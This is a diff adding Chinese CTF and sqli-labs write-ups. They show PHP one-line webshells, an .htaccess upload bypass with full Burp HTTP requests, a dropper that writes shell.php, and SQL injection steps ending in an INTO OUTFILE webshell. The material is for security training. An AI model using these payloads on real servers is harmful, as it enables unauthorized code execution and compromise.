@@ -1493,6 +1493,113 @@ Upload Success! Look here~ ./uplo4d/ff66b3e97751db68e9248c93806c7119.phtml
 
 ------
 
+### BUU UPLOAD COURSE 1
+
+打开靶机，网页能上传文件，并且有行文字说明“文件会被上传到 ./uploads”。随便上传点什么吧，新建一个`php`文件，内容为`<?php @eval("echo 'Hello';")?>`。上传成功后，靶机显示“文件已储存在: uploads/68cfe47bc11bc.jpg”，这说明靶机自动修改了后缀。来都来了，先看看吧。访问`/index.php?file=uploads/68cfe47bc11bc.jpg`，可以看到页面上有文字Hello，这说明靶机虽然修改了后缀但是仍然能够执行`PHP`代码。马上安排一句话木马，新建一个`php`文件，内容为`<?php @eval($_POST['shell']) ?>`。上传成功后，靶机显示“文件已储存在: uploads/68cfe33b7b3f1.jpg”。打开`AntSword`，添加数据，URL地址为`靶机/index.php?file=uploads/68cfe33b7b3f1.jpg`，连接密码为`shell`，点击测试连接提示连接成功。连接成功后可以在根目录看到`flag`文件，提交`flag`中的内容即可。
+
+------
+
+### [MRCTF2020]你传你🐎呢
+
+打开靶机，可以看到一张英雄联盟的游戏截图和孙笑川的照片。直接上传`.php`文件显示：
+
+> 我扌your problem?
+
+上传失败了，靶机限制了可以上传的文件类型。通过对可上传的文件类型进行 fuzzing，我们可以发现能上传`.jpg`，`.png`，`.html`和`.htaccess`文件。PHP相关文件是不能上传的。
+
+既然可以上传`.htaccess`文件，那就能让后端将所有`.jpg`文件都当作`PHP`文件进行处理。
+
+```htaccess
+<IfModule mime_module>
+AddType application/x-httpd-php .jpg
+</IfModule>
+```
+
+将上述内容写入`.htaccess`文件进行上传。
+
+```html
+POST /upload.php HTTP/1.1
+Host: 43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
+Content-Length: 379
+Cache-Control: max-age=0
+Accept-Language: zh-CN,zh;q=0.9
+Origin: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryurys2vleWNueTN13
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=adf2fe12883990c060a4a922d7317153
+Connection: keep-alive
+
+------WebKitFormBoundaryurys2vleWNueTN13
+Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
+Content-Type: image/jpeg
+
+<IfModule mime_module>
+AddType application/x-httpd-php .jpg
+</IfModule>
+------WebKitFormBoundaryurys2vleWNueTN13
+Content-Disposition: form-data; name="submit"
+
+一键去世
+------WebKitFormBoundaryurys2vleWNueTN13--
+```
+
+文件上传成功后，网页显示信息如下：
+
+> Warning: mkdir(): File exists in /var/www/html/upload.php on line 23
+>
+> /var/www/html/upload/a53eae37058c5b2e2fe267b8d7229b93/.htaccess succesfully uploaded!
+
+随后，我们上传一个写入`PHP Webshell`的`jpg`文件，当用户访问该`jpg`文件时，就能自动生成`shell.php`文件。先将以下代码写入`a.php`文件中。
+
+```php
+<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST[shell]) ?>'); ?>
+```
+
+用`Burp Suite`将其文件类型修改为`image/jpeg`，文件名也修改为`a.jpg`。
+
+```html
+POST /upload.php HTTP/1.1
+Host: 43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
+Content-Length: 377
+Cache-Control: max-age=0
+Accept-Language: zh-CN,zh;q=0.9
+Origin: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywqoMrtSyNb3BHY9T
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=adf2fe12883990c060a4a922d7317153
+Connection: keep-alive
+
+------WebKitFormBoundarywqoMrtSyNb3BHY9T
+Content-Disposition: form-data; name="uploaded"; filename="a.jpg"
+Content-Type: image/jpeg
+
+<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST[shell]) ?>'); ?>
+------WebKitFormBoundarywqoMrtSyNb3BHY9T
+Content-Disposition: form-data; name="submit"
+
+一键去世
+------WebKitFormBoundarywqoMrtSyNb3BHY9T--
+```
+
+文件上传成功后，网页显示信息如下：
+
+> Warning: mkdir(): File exists in /var/www/html/upload.php on line 23
+> /var/www/html/upload/a53eae37058c5b2e2fe267b8d7229b93/a.jpg succesfully uploaded!
+
+先用浏览器访问该文件`a.jpg`，靶机会如我们所愿生成`shell.php`文件，用`AntSword`连接靶机，可以看到`shell.php`文件内容为PHP一句话木马，且在靶机根目录存在`flag`文件。
+
+![](https://paper.tanyaodan.com/BUUCTF/mrctf2020_upload.jpg)
+
+------
+
 ### [极客大挑战 2019]BabySQL
 
 简单地尝试下：
@@ -3000,7 +3107,7 @@ MySQL自带四个库，其中`information_schema`库下存放着数据库对象�
 
 4.**使用`union`联合查询语句判断显示位**
 
-输入`?id=-1' union select 1,2,3--+`可以看到回显结果依旧是You are in...........。
+先使`union`前面的内容为假，比如`?id=-1' union`，这样就只会显示`union`后面的内容查询结果。输入`?id=-1' union select 1,2,3--+`可以看到回显结果是You are in...........。
 
 由于我们在判断数据有几列的过程中看见了报错信息，因此可以尝试SQL报错注入。
 
@@ -3324,21 +3431,47 @@ Table: users
 
 > Please input the ID as parameter with numeric value
 
-不想写这么详细了，简单记录即可，闭合字符是`"`。
+1.**判断是否存在SQL注入点**
+
+输入`?id=1`可以看到信息：
+
+> You are in...........
+
+输入`?id=1 and 1=1`依旧可以看到一样的回显，我们通过布尔条件测试说明存在注入点。
+
+2.**判断闭合字符，注释后面的内容**
+
+输入`?id=1'`依旧可以看到信息：
+
+> You are in...........
 
 输入`?id=1"`回显如下：
 
 > You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1
 
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。
+
 输入`?id=1"--+`回显如下：
 
 > You are in...........
 
-输入`?id=1" order by 3--+`知道数据有`3`列。
+这说明该注入点的闭合字符是`"`。
 
-输入`?id=-1" union select 1,2,3--+`可以看到回显结果依旧是You are in...........。
+3.**使用`order by`排序语句判断有几列数据**
+
+先随便写个数字来猜测有几行数据，输入`?id=1' order by 6--+`看到以下信息，说明列数是小于6的。
+
+> Unknown column '6' in 'order clause'
+
+再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而输入`?id=1" order by 3--+`时，回显是You are in...........，说明列数为3，即数据有`3`列。
+
+4.**使用`union`联合查询语句判断显示位**
+
+先使`union`前面的内容为假，比如`?id=-1" union`，这样就只会显示`union`后面的内容查询结果。输入`?id=-1" union select 1,2,3--+`可以看到回显结果是You are in...........。
 
 由于我们在判断数据有几列的过程中看见了报错信息，因此可以尝试SQL报错注入。
+
+5.**爆破数据库名**
 
 `updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。例如可以利用`database()`回显当前连接的数据库。
 
@@ -3378,3 +3511,76 @@ Table: users
 
 ------
 
+### Less-7
+
+本题小标题：**GET -Dump into outfile - String**。
+
+进入靶机后可以看到信息：
+
+> Please input the ID as parameter with numeric value
+
+1.**判断是否存在SQL注入点**
+
+输入`?id=1`可以看到回显信息：
+
+> You are in.... Use outfile......
+
+输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。
+
+2.**判断闭合字符，注释后面的内容**
+
+常见的闭合字符有四种：`'`，`"`，`')`，`'))`。
+
+输入`?id=1'`可以看到信息：
+
+> You have an error in your SQL syntax
+
+说明闭合方式存在问题，但是回显信息只有一行。
+
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。
+
+然而，输入`?id=1'--+`依旧看到报错信息，说明`'`并不是该注入点的闭合字符。
+
+输入`?id=1"`，显示信息：
+
+> You are in.... Use outfile......
+
+输入`?id=1')`可以看到回显信息：
+
+> You have an error in your SQL syntax
+
+输入`?id=1')--+`依旧看到报错信息，说明`')`并不是该注入点的闭合字符。
+
+输入`?id=1'))`可以看到回显信息：
+
+> You have an error in your SQL syntax
+
+而输入`?id=1'))--+`可以看到正常回显信息You are in.... Use outfile......，说明该注入点的闭合字符是`'))`。
+
+3.**使用`order by`排序语句判断有几列数据**
+
+先随便写个数字来猜测有几行数据，输入`?id=1')) order by 6--+`看到以下信息，说明列数是小于6的。
+
+> You have an error in your SQL syntax
+
+再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显是You are in...........，说明列数为3。
+
+4.**使用`union`联合查询语句判断显示位**
+
+先使`union`前面的内容为假，比如`?id=-1')) union`，这样就只会显示`union`后面的内容查询结果。输入`?id=-1')) union select 1,2,3--+`看到回显结果是You are in...........，因此显示位是第3位。
+
+5.**通过转储到输出文件进行sql注入**
+
+这道题的小标题是**GET -Dump into outfile - String**。
+
+先来介绍文件操作的函数：`load_file(file_name)`能读取文件并返回该文件的内容作为第一个字符串。使用条件：①必须有读取权限并且文件必须完全可读；②预读取文件必须在服务器上；③必须指定文件的完整路径；④预读取文件必须小于`max_allowed_packet`。
+
+`SELECT ... INTO OUTFILE 'file_name'`可以将被选择的行写入到一个文件中，该文件被创建在服务器主机上，因此必须拥有文件权限才能使用此语法。也就是说我们可以通过`?id=-1')) union select 1,2,3 into outfile "/var/www/sqli-labs/Less7/test.txt" --+`写入数据。此处的第3位可以换成`PHP`的一句话木马`<?php @eval($_POST['shell'])?>`，即改成以下代码：
+
+```sql
+?id=-1')) union select 1,2,<?php @eval($_POST['shell'])?> into outfile "/var/www/sqli-labs/Less7/test.txt" --+
+```
+
+`PHP`一句话木马上传成功后，用`AntSword`连接靶机即可。
+
+------
